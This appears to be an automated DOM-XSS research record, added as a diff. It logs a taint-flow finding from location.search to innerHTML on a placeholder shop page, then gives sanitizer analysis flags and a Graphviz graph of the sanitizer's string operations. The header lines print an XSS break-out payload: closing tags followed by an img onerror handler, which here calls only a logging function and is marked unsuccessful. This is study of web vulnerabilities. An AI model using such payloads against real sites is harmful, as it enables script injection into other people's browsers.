@@ -1,0 +1,248 @@
+// Finding: 179a8e0f-3553-4a05-8498-32e68b1043e4
+// Finding.url: https://www.loja.example194.com/lgpd?utm_source=portal&utm_content=20210318-&utm_campaign=se"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('b8f31b3b72bf4b77ae5f6b0f7b11d08e')><!--/*rpro-lgpd&lang=en&utm_medium=banner
+// Finding.parentloc: https://www.loja.example194.com/lgpd?utm_source=portal&utm_content=20210318-&utm_campaign=se"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('b8f31b3b72bf4b77ae5f6b0f7b11d08e')><!--/*rpro-lgpd&lang=en&utm_medium=banner
+// Finding.domain: www.loja.example194.com
+// Finding.base_domain: example194.com
+// Finding.source: location.search
+// Finding.sink: innerHTML
+// Sanitizer.score: 3
+// Sanitizer.name: u
+// Sanitizer.location: https://static.example195.com/unpkg/@wix/santa-core-utils@1.2697.0/dist/coreUtils.js - u:1:36447
+// Finding.begin: 1342
+// Finding.end: 1343
+// Finding.original_uuid: ce94bbe0-6935-4578-b94c-cac6136fd7e8
+// Finding.TwentyFiveMillionFlowsId: 273386808
+// Finding.script: https://static.example195.com/unpkg/@wix/santa-components@1.1974.0/dist/santa-components.prod.js
+// Finding.line: 3
+// Exploit.uuid: b8f31b3b-72bf-4b77-ae5f-6b0f7b11d08e
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: e"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: e"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 90
+// Exploit.end_taint_url: 91
+// Exploit.replace_begin_url: 90
+// Exploit.replace_end_url: 91
+// Exploit.replace_begin_param: 1342
+// Exploit.replace_end_param: 1343
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: true
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: true
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1159650369
+// DepGraph.sanitizer_hash: -1987557876
+// Non Finite Regex with function on rhs:  replace(&#([a-zA-Z0-9]*);?/g: 1, s: 0, u: 0, m: 1, i: 1 [escapes(), function_rhs: true], 'function(e,t){return"x"===t[0]||"X"===t[0]?String.fromCharCode(parseInt(t.substr(1),16)):String.fromCharCode(parseInt(t,10))}') - Left hand side has to be a range 
+// Approximated Implementation for:  replace(&#([a-zA-Z0-9]*);?/g: 1, s: 0, u: 0, m: 1, i: 1 [escapes(), function_rhs: true], 'function(e,t){return"x"===t[0]||"X"===t[0]?String.fromCharCode(parseInt(t.substr(1),16)):String.fromCharCode(parseInt(t,10))}') - Left hand side has to be a range 
+// Removed LR concats 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="substr"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=box, label="Lit: 1"];
+n4 [shape=ellipse, label="split"];
+n5 [shape=box, label="Lit: &"];
+n6 [shape=box, label="Var: x"];
+n7 [shape=ellipse, label="split"];
+n8 [shape=box, label="Lit: ="];
+n9 [shape=box, label="Var: x"];
+n10 [shape=ellipse, label="preg_replace"];
+n11 [shape=box, label="RegExp: /\+/"];
+n12 [shape=box, label="Lit:  "];
+n13 [shape=box, label="Var: x"];
+n14 [shape=ellipse, label="decodeURIComponent"];
+n15 [shape=box, label="Var: x"];
+n16 [shape=ellipse, label="encodeURIComponent"];
+n17 [shape=box, label="Var: x"];
+n18 [shape=ellipse, label="."];
+n19 [shape=box, label="Lit: lang="];
+n20 [shape=ellipse, label="."];
+n21 [shape=box, label="Lit: ?"];
+n22 [shape=ellipse, label="."];
+n23 [shape=box, label="Lit: https://www.loja.example194.com/lgpd2"];
+n24 [shape=ellipse, label="."];
+n25 [shape=box, label="Lit: href=""];
+n26 [shape=ellipse, label="."];
+n27 [shape=box, label="Lit: \""];
+n28 [shape=ellipse, label="."];
+n29 [shape=box, label="Lit:  "];
+n30 [shape=ellipse, label="."];
+n31 [shape=box, label="Lit:  "];
+n32 [shape=ellipse, label="."];
+n33 [shape=box, label="Lit: <a "];
+n34 [shape=ellipse, label="."];
+n35 [shape=box, label="Lit: >"];
+n36 [shape=ellipse, label="preg_replace"];
+n37 [shape=box, label="RegExp: /<!--[\s\S]*?-->/"];
+n38 [shape=box, label="Lit: "];
+n39 [shape=box, label="Var: x"];
+n40 [shape=ellipse, label="substr"];
+n41 [shape=box, label="Var: x"];
+n42 [shape=box, label="Lit: 0"];
+n43 [shape=box, label="Lit: 148"];
+n44 [shape=ellipse, label="substr"];
+n45 [shape=box, label="Var: x"];
+n46 [shape=box, label="Lit: 3"];
+n47 [shape=box, label="Lit: -4"];
+n48 [shape=ellipse, label="trim"];
+n49 [shape=box, label="Var: x"];
+n50 [shape=ellipse, label="substr"];
+n51 [shape=box, label="Var: x"];
+n52 [shape=box, label="Lit: 6"];
+n53 [shape=box, label="Lit: 44"];
+n54 [shape=ellipse, label="trim"];
+n55 [shape=box, label="Var: x"];
+n56 [shape=ellipse, label="preg_replace"];
+n57 [shape=box, label="RegExp: /&quot;/"];
+n58 [shape=box, label="Lit: \""];
+n59 [shape=box, label="Var: x"];
+n60 [shape=ellipse, label="preg_replace"];
+n61 [shape=box, label="RegExp: /&#([a-zA-Z0-9]*);?/"];
+n62 [shape=box, label="Lit: "];
+n63 [shape=box, label="Var: x"];
+n64 [shape=ellipse, label="preg_replace"];
+n65 [shape=box, label="RegExp: /&colon;?/"];
+n66 [shape=box, label="Lit: :"];
+n67 [shape=box, label="Var: x"];
+n68 [shape=ellipse, label="preg_replace"];
+n69 [shape=box, label="RegExp: /&newline;?/"];
+n70 [shape=box, label="Lit:  "];
+n71 [shape=box, label="Var: x"];
+n72 [shape=ellipse, label="char_at"];
+n73 [shape=box, label="Lit: 42"];
+n74 [shape=box, label="Var: x"];
+n75 [shape=ellipse, label="."];
+n76 [shape=box, label="Lit: https://www.loja.example194.com/lgpd2?lang="];
+n77 [shape=ellipse, label="trim"];
+n78 [shape=box, label="Var: x"];
+n79 [shape=ellipse, label="trim"];
+n80 [shape=box, label="Var: x"];
+n81 [shape=ellipse, label="preg_replace"];
+n82 [shape=box, label="RegExp: /["]/"];
+n83 [shape=box, label="Lit: &quot;"];
+n84 [shape=box, label="Var: x"];
+n85 [shape=ellipse, label="preg_replace"];
+n86 [shape=box, label="RegExp: /[<]/"];
+n87 [shape=box, label="Lit: &lt;"];
+n88 [shape=box, label="Var: x"];
+n89 [shape=ellipse, label="preg_replace"];
+n90 [shape=box, label="RegExp: /[>]/"];
+n91 [shape=box, label="Lit: &gt;"];
+n92 [shape=box, label="Var: x"];
+n93 [shape=box, label="Var: x"];
+n94 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n1 -> n3;
+n6 -> n1;
+n4 -> n5;
+n4 -> n6;
+n9 -> n4;
+n7 -> n8;
+n7 -> n9;
+n13 -> n7;
+n10 -> n11;
+n10 -> n12;
+n10 -> n13;
+n15 -> n10;
+n14 -> n15;
+n17 -> n14;
+n16 -> n17;
+n18 -> n19;
+n18 -> n16;
+n20 -> n21;
+n20 -> n18;
+n22 -> n23;
+n22 -> n20;
+n24 -> n25;
+n24 -> n22;
+n26 -> n24;
+n26 -> n27;
+n28 -> n29;
+n28 -> n26;
+n30 -> n28;
+n30 -> n31;
+n32 -> n33;
+n32 -> n30;
+n34 -> n32;
+n34 -> n35;
+n39 -> n34;
+n36 -> n37;
+n36 -> n38;
+n36 -> n39;
+n41 -> n36;
+n40 -> n41;
+n40 -> n42;
+n40 -> n43;
+n45 -> n40;
+n44 -> n45;
+n44 -> n46;
+n44 -> n47;
+n49 -> n44;
+n48 -> n49;
+n51 -> n48;
+n50 -> n51;
+n50 -> n52;
+n50 -> n53;
+n55 -> n50;
+n54 -> n55;
+n59 -> n54;
+n56 -> n57;
+n56 -> n58;
+n56 -> n59;
+n63 -> n56;
+n60 -> n61;
+n60 -> n62;
+n60 -> n63;
+n67 -> n60;
+n64 -> n65;
+n64 -> n66;
+n64 -> n67;
+n71 -> n64;
+n68 -> n69;
+n68 -> n70;
+n68 -> n71;
+n74 -> n68;
+n72 -> n73;
+n72 -> n74;
+n75 -> n76;
+n75 -> n72;
+n78 -> n75;
+n77 -> n78;
+n80 -> n77;
+n79 -> n80;
+n84 -> n79;
+n81 -> n82;
+n81 -> n83;
+n81 -> n84;
+n88 -> n81;
+n85 -> n86;
+n85 -> n87;
+n85 -> n88;
+n92 -> n85;
+n89 -> n90;
+n89 -> n91;
+n89 -> n92;
+n93 -> n89;
+n94 -> n93;
+}
